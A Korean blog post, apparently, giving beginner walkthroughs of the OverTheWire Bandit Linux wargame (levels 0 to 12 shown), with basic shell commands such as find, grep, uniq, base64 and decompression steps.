---
layout: post
title: "프론티어_리눅스 기반 시스템 탐색 및 데이터 분석 (Bandit 0–24)"
date: 2026-04-29 04:31:00
desc: "OverTheWire Bandit Level 0~24 풀이 모음"
keywords: "OverTheWire,Bandit,Wargame,CTF,Linux,보안"
categories: [CTF/Wargame]
tags: ["Wargame", "Bandit", "OverTheWire", "Linux"]
icon: fa-flag
---

> Source: [https://sanghole.tistory.com/34](https://sanghole.tistory.com/34)

<style>
.bw-radio{position:absolute;opacity:0;pointer-events:none;width:0;height:0}
.bw-wrap{position:relative;margin-top:1.5rem}
.bw-nav{display:flex;flex-wrap:wrap;gap:6px;margin-bottom:2rem;padding-bottom:1.5rem;border-bottom:1px solid oklch(0.28 0.04 225/0.45)}
.bw-btn{display:inline-block;font-family:'JetBrains Mono',ui-monospace,monospace;font-size:10px;letter-spacing:.06em;padding:5px 12px;border:1px solid oklch(0.28 0.04 225/0.45);border-radius:3px;color:oklch(0.65 0.025 215);cursor:pointer;transition:color .15s,border-color .15s,background .15s;user-select:none;background:transparent;white-space:nowrap}
.bw-btn:hover{border-color:oklch(0.76 0.11 190/0.6);color:oklch(0.76 0.11 190)}
.bw-panel{display:none;padding:.25rem 0;animation:bw-fade .2s ease}
@keyframes bw-fade{from{opacity:0;transform:translateY(4px)}to{opacity:1;transform:translateY(0)}}
.bw-panel h3{font-style:italic;font-weight:300;font-size:1.35rem;margin-bottom:1.25rem;color:oklch(0.76 0.11 190);letter-spacing:-.02em;border-bottom:1px solid oklch(0.22 0.03 228/0.22);padding-bottom:.75rem}
.bw-panel p{margin-bottom:1rem;color:oklch(0.95 0.015 205);line-height:1.75}
.bw-panel code{background:oklch(0.12 0.04 220/0.5);color:oklch(0.76 0.11 190);padding:.12rem .4rem;font-family:'JetBrains Mono',ui-monospace,monospace;font-size:.85em;border-radius:2px}
.bw-cmd{background:#03080f;color:oklch(0.90 0.02 205);padding:1rem 1.25rem;margin:1rem 0;font-family:'JetBrains Mono',ui-monospace,monospace;font-size:.85rem;line-height:1.6;border:1px solid oklch(0.28 0.04 225/0.45);border-radius:4px;overflow-x:auto;white-space:pre}
.bw-ref{display:block;font-family:'JetBrains Mono',ui-monospace,monospace;font-size:.8rem;color:oklch(0.72 0.14 210);text-decoration:underline;text-underline-offset:3px;margin:.75rem 0;word-break:break-all}
.bw-tip{border-left:2px solid oklch(0.76 0.11 190/0.5);padding:.5rem 0 .5rem 1.1rem;margin:1rem 0;color:oklch(0.80 0.025 210);font-style:italic}
.bw-done{display:inline-block;font-family:'JetBrains Mono',ui-monospace,monospace;font-size:9px;letter-spacing:.12em;text-transform:uppercase;color:oklch(0.65 0.10 150);border:1px solid oklch(0.65 0.10 150/0.4);padding:3px 10px;border-radius:999px;margin-bottom:1.25rem}
#bwl0:checked~.bw-p0{display:block}
#bwl1:checked~.bw-p1{display:block}
#bwl2:checked~.bw-p2{display:block}
#bwl3:checked~.bw-p3{display:block}
#bwl4:checked~.bw-p4{display:block}
#bwl5:checked~.bw-p5{display:block}
#bwl6:checked~.bw-p6{display:block}
#bwl7:checked~.bw-p7{display:block}
#bwl8:checked~.bw-p8{display:block}
#bwl9:checked~.bw-p9{display:block}
#bwl10:checked~.bw-p10{display:block}
#bwl11:checked~.bw-p11{display:block}
#bwl12:checked~.bw-p12{display:block}
#bwl13:checked~.bw-p13{display:block}
#bwl14:checked~.bw-p14{display:block}
#bwl15:checked~.bw-p15{display:block}
#bwl16:checked~.bw-p16{display:block}
#bwl17:checked~.bw-p17{display:block}
#bwl18:checked~.bw-p18{display:block}
#bwl19:checked~.bw-p19{display:block}
#bwl20:checked~.bw-p20{display:block}
#bwl21:checked~.bw-p21{display:block}
#bwl22:checked~.bw-p22{display:block}
#bwl23:checked~.bw-p23{display:block}
#bwl24:checked~.bw-p24{display:block}
#bwl0:checked~.bw-nav label[for=bwl0],#bwl1:checked~.bw-nav label[for=bwl1],#bwl2:checked~.bw-nav label[for=bwl2],#bwl3:checked~.bw-nav label[for=bwl3],#bwl4:checked~.bw-nav label[for=bwl4],#bwl5:checked~.bw-nav label[for=bwl5],#bwl6:checked~.bw-nav label[for=bwl6],#bwl7:checked~.bw-nav label[for=bwl7],#bwl8:checked~.bw-nav label[for=bwl8],#bwl9:checked~.bw-nav label[for=bwl9],#bwl10:checked~.bw-nav label[for=bwl10],#bwl11:checked~.bw-nav label[for=bwl11],#bwl12:checked~.bw-nav label[for=bwl12],#bwl13:checked~.bw-nav label[for=bwl13],#bwl14:checked~.bw-nav label[for=bwl14],#bwl15:checked~.bw-nav label[for=bwl15],#bwl16:checked~.bw-nav label[for=bwl16],#bwl17:checked~.bw-nav label[for=bwl17],#bwl18:checked~.bw-nav label[for=bwl18],#bwl19:checked~.bw-nav label[for=bwl19],#bwl20:checked~.bw-nav label[for=bwl20],#bwl21:checked~.bw-nav label[for=bwl21],#bwl22:checked~.bw-nav label[for=bwl22],#bwl23:checked~.bw-nav label[for=bwl23],#bwl24:checked~.bw-nav label[for=bwl24]{background:oklch(0.76 0.11 190/0.15);border-color:oklch(0.76 0.11 190/0.6);color:oklch(0.76 0.11 190)}
.bw-imgs{display:flex;flex-wrap:wrap;gap:8px;margin:1.25rem 0}
.bw-imgs img{max-width:100%;height:auto;border-radius:6px;border:1px solid oklch(0.28 0.04 225/0.45);background:oklch(0.04 0.01 230)}
</style>

<div class="bw-wrap">

<input type="radio" name="bwlv" id="bwl0"  class="bw-radio" checked>
<input type="radio" name="bwlv" id="bwl1"  class="bw-radio">
<input type="radio" name="bwlv" id="bwl2"  class="bw-radio">
<input type="radio" name="bwlv" id="bwl3"  class="bw-radio">
<input type="radio" name="bwlv" id="bwl4"  class="bw-radio">
<input type="radio" name="bwlv" id="bwl5"  class="bw-radio">
<input type="radio" name="bwlv" id="bwl6"  class="bw-radio">
<input type="radio" name="bwlv" id="bwl7"  class="bw-radio">
<input type="radio" name="bwlv" id="bwl8"  class="bw-radio">
<input type="radio" name="bwlv" id="bwl9"  class="bw-radio">
<input type="radio" name="bwlv" id="bwl10" class="bw-radio">
<input type="radio" name="bwlv" id="bwl11" class="bw-radio">
<input type="radio" name="bwlv" id="bwl12" class="bw-radio">
<input type="radio" name="bwlv" id="bwl13" class="bw-radio">
<input type="radio" name="bwlv" id="bwl14" class="bw-radio">
<input type="radio" name="bwlv" id="bwl15" class="bw-radio">
<input type="radio" name="bwlv" id="bwl16" class="bw-radio">
<input type="radio" name="bwlv" id="bwl17" class="bw-radio">
<input type="radio" name="bwlv" id="bwl18" class="bw-radio">
<input type="radio" name="bwlv" id="bwl19" class="bw-radio">
<input type="radio" name="bwlv" id="bwl20" class="bw-radio">
<input type="radio" name="bwlv" id="bwl21" class="bw-radio">
<input type="radio" name="bwlv" id="bwl22" class="bw-radio">
<input type="radio" name="bwlv" id="bwl23" class="bw-radio">
<input type="radio" name="bwlv" id="bwl24" class="bw-radio">

<nav class="bw-nav">
  <label for="bwl0"  class="bw-btn">Level 0</label>
  <label for="bwl1"  class="bw-btn">Level 1→2</label>
  <label for="bwl2"  class="bw-btn">Level 2→3</label>
  <label for="bwl3"  class="bw-btn">Level 3→4</label>
  <label for="bwl4"  class="bw-btn">Level 4→5</label>
  <label for="bwl5"  class="bw-btn">Level 5→6</label>
  <label for="bwl6"  class="bw-btn">Level 6→7</label>
  <label for="bwl7"  class="bw-btn">Level 7→8</label>
  <label for="bwl8"  class="bw-btn">Level 8→9</label>
  <label for="bwl9"  class="bw-btn">Level 9→10</label>
  <label for="bwl10" class="bw-btn">Level 10→11</label>
  <label for="bwl11" class="bw-btn">Level 11→12</label>
  <label for="bwl12" class="bw-btn">Level 12→13</label>
  <label for="bwl13" class="bw-btn">Level 13→14</label>
  <label for="bwl14" class="bw-btn">Level 14→15</label>
  <label for="bwl15" class="bw-btn">Level 15→16</label>
  <label for="bwl16" class="bw-btn">Level 16→17</label>
  <label for="bwl17" class="bw-btn">Level 17→18</label>
  <label for="bwl18" class="bw-btn">Level 18→19</label>
  <label for="bwl19" class="bw-btn">Level 19→20</label>
  <label for="bwl20" class="bw-btn">Level 20→21</label>
  <label for="bwl21" class="bw-btn">Level 21→22</label>
  <label for="bwl22" class="bw-btn">Level 22→23</label>
  <label for="bwl23" class="bw-btn">Level 23→24</label>
  <label for="bwl24" class="bw-btn">Level 24→25</label>
</nav>

<div class="bw-panel bw-p0">
  <span class="bw-done">solved</span>
  <h3>Level 0</h3>
  <p><code>ls</code> 검색 후, <code>cat readme</code>하면 바로 다음 문제가 나옴..!</p>
  <div class="bw-cmd">$ ls
$ cat readme</div>
<div class="bw-imgs">
  <img src="https://blog.kakaocdn.net/dna/cfn5eE/dJMcadBIJDJ/AAAAAAAAAAAAAAAAAAAAANtrzd_C7yBhjao_5ET0_tazkc3ciF-DzwirbZWyJRh9/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1777561199&allow_ip=&allow_referer=&signature=gvjtIUgqMGsr1cseTnoNjxpr8WQ%3D" loading="lazy" alt="">
  <img src="https://blog.kakaocdn.net/dna/bRLnPb/dJMcahc8hxX/AAAAAAAAAAAAAAAAAAAAAMA75P7_lbbOWeB5hIbsodkeMey4kK3lYyvIsS-Ju8Z1/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1777561199&allow_ip=&allow_referer=&signature=8MD%2FdKAWPMK%2BfqKDG6%2FmpoERT4k%3D" loading="lazy" alt="">
</div>
</div>

<div class="bw-panel bw-p1">
  <span class="bw-done">solved</span>
  <h3>Level 1 → 2</h3>
  <p>파일 이름이 <code>-</code> 라서 뭐 <code>cd</code> 이런거 다 쳐보다가 약간 노가다로 이런거 저런거 다 해보다가 약간 운이 좋게?.. 풀게 됨...</p>
  <p>이걸로 파일을 실제로 만드는 것은 안 좋다고 했고, <code>&lt;</code> 이거나 <code>./</code> 이런걸로 실제로 열수 있다고 함!</p>
  <div class="bw-cmd">$ cat &lt; -
$ cat ./-</div>
<div class="bw-imgs">
  <img src="https://blog.kakaocdn.net/dna/OqvZE/dJMcacpmThk/AAAAAAAAAAAAAAAAAAAAAGRVIHqG_7Z5OhAgqDh4aLVzM2b_3xIrL6Q8e_xKJil6/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1777561199&allow_ip=&allow_referer=&signature=DbhO799NwYVf0%2BrdO2ZzBoXT9i4%3D" loading="lazy" alt="">
  <img src="https://blog.kakaocdn.net/dna/vH3Ed/dJMcac3Wl7Q/AAAAAAAAAAAAAAAAAAAAACbukQiRNnHpAR5hzENJI-4G41t1cA9IaCx1yGB-J98g/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1777561199&allow_ip=&allow_referer=&signature=Zw7dDVthG2mkKqLrXWmEfHyNyV4%3D" loading="lazy" alt="">
</div>
</div>

<div class="bw-panel bw-p2">
  <span class="bw-done">solved</span>
  <h3>Level 2 → 3</h3>
  <p>파일 이름에 spaces가 있을 때 <code>" "</code> 이거를 사용한다고 알고 있어서 빠르게 품.!!</p>
  <div class="bw-cmd">$ cat "spaces in this filename"</div>
<div class="bw-imgs">
  <img src="https://blog.kakaocdn.net/dna/bx5A83/dJMcaiC52GD/AAAAAAAAAAAAAAAAAAAAAObkpk5Zl-1ko-43LvwEF1RkYpmgk8RueCKylcD1Y2d9/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1777561199&allow_ip=&allow_referer=&signature=a%2FQMbCaWUUflQQWJ%2FH5D4S7liFk%3D" loading="lazy" alt="">
  <img src="https://blog.kakaocdn.net/dna/bMpbdY/dJMcaf0FcjS/AAAAAAAAAAAAAAAAAAAAAE97gp9MjP6h_JKD2zmxb4L90i4jwa7ihZkFP_88B95k/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1777561199&allow_ip=&allow_referer=&signature=SwAOS%2B%2F0A3WCeWHagF6jiY8JcJo%3D" loading="lazy" alt="">
</div>
</div>

<div class="bw-panel bw-p3">
  <span class="bw-done">solved</span>
  <h3>Level 3 → 4</h3>
  <p><code>ls -al</code> 치면 숨긴 파일 + 상세 파일 정보명이 뜬다고 알고 있어서, 항상 <code>ls</code>만 안치고 <code>ls -al</code>까지 치는 습관이 있어서 그렇게 했더니 풀린 문제.</p>
  <div class="bw-cmd">$ cd inhere
$ ls -al</div>
<div class="bw-imgs">
  <img src="https://blog.kakaocdn.net/dna/b3jzbN/dJMcaayksrJ/AAAAAAAAAAAAAAAAAAAAAJ30CUYindi01aToY49BjTvYWjkPZZG-k_B7IhsY5Z2Z/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1777561199&allow_ip=&allow_referer=&signature=XM8rspWCW6y%2FQnQuNmUAmMSSV3c%3D" loading="lazy" alt="">
  <img src="https://blog.kakaocdn.net/dna/FWyHW/dJMcaaE6LLK/AAAAAAAAAAAAAAAAAAAAAA3fKD9VKIdeSgxkO0fUZvqiNxqM9pCQpKGF-uAQygHr/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1777561199&allow_ip=&allow_referer=&signature=OGMKoOf0WknCnBLpb6wasplPJzY%3D" loading="lazy" alt="">
</div>
</div>

<div class="bw-panel bw-p4">
  <span class="bw-done">solved</span>
  <h3>Level 4 → 5</h3>
  <p>무식하게 <code>inhere</code> 디렉토리 안의 파일들을 하나씩 열어봄. 인간이 읽을 수 있는 텍스트 파일만 찾으면 됨 ㅎㅎ.</p>
  <div class="bw-cmd">$ cd inhere
$ file ./-file0*</div>
<div class="bw-imgs">
  <img src="https://blog.kakaocdn.net/dna/bMJHE6/dJMcai37EEZ/AAAAAAAAAAAAAAAAAAAAAJskBcoZxmwh72oqMU4ACe-KUSDdKtmk2IgRIkMZ0Dyi/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1777561199&allow_ip=&allow_referer=&signature=fiv1TmFY%2Fq3cbwH6Dme1nGFo4wY%3D" loading="lazy" alt="">
  <img src="https://blog.kakaocdn.net/dna/ylhc2/dJMcageeVHa/AAAAAAAAAAAAAAAAAAAAAEh-_3-2Fx-uKpd0XBqwea7JI7v5xrOFDRYqQM-M-dsp/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1777561199&allow_ip=&allow_referer=&signature=bWZ3wwo7sz5eODkfqcnqpL2jp0g%3D" loading="lazy" alt="">
</div>
</div>

<div class="bw-panel bw-p5">
  <span class="bw-done">solved</span>
  <h3>Level 5 → 6</h3>
  <p>무식하게는 못 풀 듯??? <code>find</code> 함수를 쓰라는 것 같은데.. 참고 자료 보고 한번에 풀렸다 ㅎㅎ</p>
  <div class="bw-cmd">$ find ./inhere -type f -size 1033c ! -executable</div>
<div class="bw-imgs">
  <img src="https://blog.kakaocdn.net/dna/sFQn3/dJMcabDZxZg/AAAAAAAAAAAAAAAAAAAAAPW0Lzh26ittOTmv44koU-zjahTjm4c69AkxptxBxSuD/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1777561199&allow_ip=&allow_referer=&signature=hmOT%2B7hswDa0Xx8Fzq%2BLSD7KpCA%3D" loading="lazy" alt="">
  <img src="https://blog.kakaocdn.net/dna/ckuSUr/dJMcahxr733/AAAAAAAAAAAAAAAAAAAAAOQb3k_264R6igmnAO3R18t5ysFZQLGBuVlL8Xs_u1sN/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1777561199&allow_ip=&allow_referer=&signature=%2Fa5yBn5pz43J8jSvfiQ3j5u6M3Y%3D" loading="lazy" alt="">
  <img src="https://blog.kakaocdn.net/dna/Qa2p3/dJMcajopkNB/AAAAAAAAAAAAAAAAAAAAAAP5n0_sINY84UAE8df247fBrwHJAA2UuXUnOv-sBvZH/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1777561199&allow_ip=&allow_referer=&signature=eV1R91xkUtkQot3FbZkEiV%2Fdfas%3D" loading="lazy" alt="">
</div>
  <a class="bw-ref" href="https://coding-factory.tistory.com/804" target="_blank" rel="noopener">참고: coding-factory.tistory.com/804</a>
</div>

<div class="bw-panel bw-p6">
  <span class="bw-done">solved</span>
  <h3>Level 6 → 7</h3>
  <p>뒤에 오류 아무것도 안 뜨는 파일을 찾아서 <code>cat</code>을 해봤더니 풀렸음..</p>
  <div class="bw-cmd">$ find / -user bandit7 -group bandit6 -size 33c 2&gt;/dev/null</div>
<div class="bw-imgs">
  <img src="https://blog.kakaocdn.net/dna/O46zR/dJMcabqtB2G/AAAAAAAAAAAAAAAAAAAAAEPvGKiQzLobHqJil2X4FfVtt3x3pO6QZsu_lY5fDQnD/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1777561199&allow_ip=&allow_referer=&signature=mJJ%2F9SFoxe787EC6hulSd8gQEcw%3D" loading="lazy" alt="">
  <img src="https://blog.kakaocdn.net/dna/ugRlN/dJMcahRIMRA/AAAAAAAAAAAAAAAAAAAAAEPcPlmg1uIQdtIdtIO-GpZ4CLv_EyLKtW_eNsFafWn7/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1777561199&allow_ip=&allow_referer=&signature=fsugzgzl1h2dAPubESsPHreLius%3D" loading="lazy" alt="">
  <img src="https://blog.kakaocdn.net/dna/txJvT/dJMcabYiGjr/AAAAAAAAAAAAAAAAAAAAAGTgGfhvK4eaV794QdairiiwNfYeikk3U2zNFRjKS_aR/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1777561199&allow_ip=&allow_referer=&signature=WRQBVmY8%2F4dBVmMt%2FZooo3ttccI%3D" loading="lazy" alt="">
  <img src="https://blog.kakaocdn.net/dna/cDS3pm/dJMcacCUMJ4/AAAAAAAAAAAAAAAAAAAAAFa7xIVPUvH9meBZ1kgceHoz-KdpTqSQM4_Bgy7I3c6L/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1777561199&allow_ip=&allow_referer=&signature=fWe9NJYWGM0W3mc3cUPIpF27jQU%3D" loading="lazy" alt="">
</div>
  <a class="bw-ref" href="https://server-talk.tistory.com/20" target="_blank" rel="noopener">참고: server-talk.tistory.com/20</a>
</div>

<div class="bw-panel bw-p7">
  <span class="bw-done">solved</span>
  <h3>Level 7 → 8</h3>
  <p>진짜 문제 제대로 안 읽고 풀다가 <code>uniq</code>, <code>sort</code> 등 이상한거 다 하고 다시 돌아와서 <code>grep</code>으로 써서 풀었다.....</p>
  <div class="bw-cmd">$ grep "millionth" data.txt</div>
<div class="bw-imgs">
  <img src="https://blog.kakaocdn.net/dna/bUv3HB/dJMcagkYNb6/AAAAAAAAAAAAAAAAAAAAAPkUAxb-qUjDkXLpPmkrgTCbyX0YKwxONq5beMI4lEre/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1777561199&allow_ip=&allow_referer=&signature=luBQJahFWNN7plqc6vPu7I0fUFQ%3D" loading="lazy" alt="">
</div>
  <a class="bw-ref" href="https://coding-factory.tistory.com/802" target="_blank" rel="noopener">참고: coding-factory.tistory.com/802 (grep 배움)</a>
</div>

<div class="bw-panel bw-p8">
  <span class="bw-done">solved</span>
  <h3>Level 8 → 9</h3>
  <p><code>uniq</code>는 중복되는 값들을 지워주는 건데, 하기에 앞서 <code>sort</code>를 시켜줘야 한다.</p>
  <p><code>-c</code>를 붙여서 몇 번이 나왔는지에 대해서도 뽑아줘야 되었으며, <code>uniq</code>로 하면 중복되는 값들을 지워주는 게 아니라 약간 압축??? 그런거 하는 느낌.</p>
  <div class="bw-cmd">$ sort data.txt | uniq -u</div>
<div class="bw-imgs">
  <img src="https://blog.kakaocdn.net/dna/btSg9N/dJMcagyvroJ/AAAAAAAAAAAAAAAAAAAAAGLG8MOqSxNDRuPhZAcndccj1OWfd3sc-XBFqZMsykM9/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1777561199&allow_ip=&allow_referer=&signature=E0TGdl7TbFi0fXEWGZr2od33LHw%3D" loading="lazy" alt="">
  <img src="https://blog.kakaocdn.net/dna/sePbp/dJMcagZzGJd/AAAAAAAAAAAAAAAAAAAAAMuMHvu6U8wWkYMPlVUTiMAoZzNmV-QZaazVG46FOfQr/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1777561199&allow_ip=&allow_referer=&signature=8GMdtbpwD4AMEGx%2B%2BrxurbfuAnw%3D" loading="lazy" alt="">
</div>
  <div class="bw-tip">uniq -u : 딱 한 번만 등장한 줄만 출력 (중복 없는 줄)</div>
</div>

<div class="bw-panel bw-p9">
  <span class="bw-done">solved</span>
  <h3>Level 9 → 10</h3>
  <p>이게 사람이 읽을 수 있는 문자열이 아닌 것 같은 느낌? (문제에서도..) 그래서 그냥 <code>cat</code> 때리고 <code>====</code> 이거 있는 것을 찾아봤음 히히. 그냥 무지성으로 풀어버리기...</p>
  <p>찾아보니까 <code>strings</code>라고 그냥 파일 안에 포함된 문자열을 뽑아낼 수 있는 기능을 함.! 그래서 그걸 이용해서 <code>grep</code>을 사용하면 끝.</p>
  <div class="bw-cmd">$ strings data.txt | grep "=="</div>
<div class="bw-imgs">
  <img src="https://blog.kakaocdn.net/dna/cU4d2b/dJMcaaryMdF/AAAAAAAAAAAAAAAAAAAAALY0eEx2IeHffvKlZR2MwItm5YT2yP95BiZUVAbqp5vJ/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1777561199&allow_ip=&allow_referer=&signature=c25wS6LzWff%2BRh%2B28ZpS%2BS6e0Ec%3D" loading="lazy" alt="">
  <img src="https://blog.kakaocdn.net/dna/cvZYcW/dJMcahqGEOy/AAAAAAAAAAAAAAAAAAAAAHW_1gW-E9tsBrq0Hh1k1Y9_D_v-amkiy6f1853z-FkS/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1777561199&allow_ip=&allow_referer=&signature=95SGfn4Lw%2B8OLwsMw67iWGDkmWk%3D" loading="lazy" alt="">
  <img src="https://blog.kakaocdn.net/dna/wUDOp/dJMcaaLRosp/AAAAAAAAAAAAAAAAAAAAAE8K9kL1Botag0kvsU3xKWw_XhGYzVQKZp26yF_CPZFc/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1777561199&allow_ip=&allow_referer=&signature=7ERwA6JcnOeeB7wv3tt0TJpRusI%3D" loading="lazy" alt="">
</div>
</div>

<div class="bw-panel bw-p10">
  <span class="bw-done">solved</span>
  <h3>Level 10 → 11</h3>
  <p>그냥 base64 디코딩만 하면 됨!! (문제만 잘 읽는다면..)</p>
  <div class="bw-cmd">$ base64 -d data.txt</div>
<div class="bw-imgs">
  <img src="https://blog.kakaocdn.net/dna/bEIxhr/dJMcaakL0Yp/AAAAAAAAAAAAAAAAAAAAAGPb-HHf5az7Ej0gJjhPjJvOjqt1fxwC07-GawpUJeLr/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1777561199&allow_ip=&allow_referer=&signature=lOHFtz44uNOE9QuVru9tYebfuGI%3D" loading="lazy" alt="">
</div>
  <a class="bw-ref" href="https://happylie.tistory.com/8" target="_blank" rel="noopener">참고: happylie.tistory.com/8</a>
</div>

<div class="bw-panel bw-p11">
  <span class="bw-done">solved</span>
  <h3>Level 11 → 12</h3>
  <p><code>tr</code> 명령어를 통해서 ROT13 처리. 13 옮기는 거를 일일히 노트에 써가면서 어떻게 옮길지 찾아봤다.</p>
  <div class="bw-cmd">$ cat data.txt | tr 'A-Za-z' 'N-ZA-Mn-za-m'</div>
<div class="bw-imgs">
  <img src="https://blog.kakaocdn.net/dna/sDUng/dJMcafzDBqY/AAAAAAAAAAAAAAAAAAAAAMF_2QG0B3ekgjbb8gpa0xSe7hPfU8PUcMaRZdbSzGDn/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1777561199&allow_ip=&allow_referer=&signature=duzAH%2Fpss8HCbqiUSGD4Ful%2BRRY%3D" loading="lazy" alt="">
  <img src="https://blog.kakaocdn.net/dna/TsCqy/dJMcahRIOuc/AAAAAAAAAAAAAAAAAAAAAAlznBgE0-Jd7kBT2chJJ2ddMdA1pOsdL6SAJDEou0gJ/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1777561199&allow_ip=&allow_referer=&signature=YCOrPbacitbJ8lCdVqsqRtv7WYg%3D" loading="lazy" alt="">
  <img src="https://blog.kakaocdn.net/dna/bsGhef/dJMcahqGFex/AAAAAAAAAAAAAAAAAAAAAKtb-J8SLxeyh_XYl2S0MvhnN1PWoVu-gtpS80Sz6Tlm/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1777561199&allow_ip=&allow_referer=&signature=2VqJOMB8t6CwdGxznA%2BfgMkzizY%3D" loading="lazy" alt="">
</div>
  <div class="bw-tip">ROT13 = 알파벳을 13칸씩 밀어서 변환하는 Caesar cipher</div>
  <a class="bw-ref" href="https://zidarn87.tistory.com/137" target="_blank" rel="noopener">참고: zidarn87.tistory.com/137</a>
</div>

<div class="bw-panel bw-p12">
  <span class="bw-done">solved</span>
  <h3>Level 12 → 13</h3>
  <p>옛날에 bandit을 하다가 딱 이 12번 문제를 풀다가 접었다. 그 때 당시에는 이해가 안가서..</p>
  <p><code>xxd</code>를 하려고 했더니 권한이 없기 때문에, 문제에 나와있듯이 <code>/tmp</code>로 이동! 그 후에 <code>xxd -r</code> 옵션을 활용 — 헥스덤프 형태의 바이너리 파일을 다시 되돌리기 위해서!</p>
  <p>하지만 그렇게 해도 real.txt는 아직 이상한 값. <code>file</code> 명령어로 확인하면 <code>gzip</code> → <code>real.gz</code>으로 이름 바꾸고 해제 → 또 이상한 값 → <code>bzip2</code> → <code>gzip</code> → <code>tar</code> → 이 과정을 무한 반복해서 password 획득.</p>
  <div class="bw-cmd">$ cp data.txt /tmp/mydir && cd /tmp/mydir
$ xxd -r data.txt &gt; real
$ file real          # gzip 확인
$ mv real real.gz &amp;&amp; gzip -d real.gz
$ file real          # bzip2 확인
$ mv real real.bz2 &amp;&amp; bzip2 -d real.bz2
# ... 반복 ...</div>
<div class="bw-imgs">
  <img src="https://blog.kakaocdn.net/dna/cqnOcx/dJMcagyvvXn/AAAAAAAAAAAAAAAAAAAAACvrHS9--3aiMatz6Yqvks0mHerrtDL4k6vC2k6RYIgR/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1777561199&allow_ip=&allow_referer=&signature=fQ36IfchZrKT4pObSkwdsBbKYT0%3D" loading="lazy" alt="">
  <img src="https://blog.kakaocdn.net/dna/bOPkOE/dJMcahKZkCA/AAAAAAAAAAAAAAAAAAAAADlnQICR4cmG0HAlK5wKQgM46uTL5Qey5MVh54PBVPTq/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1777561199&allow_ip=&allow_referer=&signature=ehe7m9h%2B694OUeKADcGIkHEMBQU%3D" loading="lazy" alt="">
  <img src="https://blog.kakaocdn.net/dna/5Tawm/dJMcabKO9qB/AAAAAAAAAAAAAAAAAAAAAONYK_wGYgf95G2zq0niZ7U-fhVgFSzFSRCkvMfHye4F/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1777561199&allow_ip=&allow_referer=&signature=Y%2B9RavqMl%2FzDDtkg8m0ipSsILUk%3D" loading="lazy" alt="">
  <img src="https://blog.kakaocdn.net/dna/bK9P7s/dJMcabcUHjy/AAAAAAAAAAAAAAAAAAAAAD3wm88NDXuBw7ewGUVIZpPy5d9P-P9z1nsJX8lHA0M1/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1777561199&allow_ip=&allow_referer=&signature=rONxrpRIXO5qIrZS1%2FmaWkHoThc%3D" loading="lazy" alt="">
  <img src="https://blog.kakaocdn.net/dna/9dvAj/dJMcad2QEhU/AAAAAAAAAAAAAAAAAAAAACBCnUuaDgE_QwVX0UsL9gWBvm9QTFjNVmUB9v7CoPY7/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1777561199&allow_ip=&allow_referer=&signature=hgZctl5RdKP5URgnSrqrFCp%2BhI0%3D" loading="lazy" alt="">
  <img src="https://blog.kakaocdn.net/dna/wGR5x/dJMcafl7SbB/AAAAAAAAAAAAAAAAAAAAAP_8K6feO11jcI4_8c9WIWIDv72ajbBsc8TzTrfEjAvI/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1777561199&allow_ip=&allow_referer=&signature=h%2Fo1bKnIm7wA84boZ2oNW9nu2HY%3D" loading="lazy" alt="">
  <img src="https://blog.kakaocdn.net/dna/ZSvzI/dJMcadhwQLk/AAAAAAAAAAAAAAAAAAAAABodAEqwAJ2hUl7Iqpg07VAlYs8O4tvRp1lrB_h7tdez/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1777561199&allow_ip=&allow_referer=&signature=7fFtKjx09ZDQTP1cw3NtAnAjM1Q%3D" loading="lazy" alt="">
  <img src="https://blog.kakaocdn.net/dna/bmVaib/dJMcaiiPhRJ/AAAAAAAAAAAAAAAAAAAAAJk7ZxPUIWLut-yHw5BEzsI6XGgap0EnBdmGAiFKAeik/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1777561199&allow_ip=&allow_referer=&signature=999CQqgMsFfnsBRZayB7qcfH91E%3D" loading="lazy" alt="">
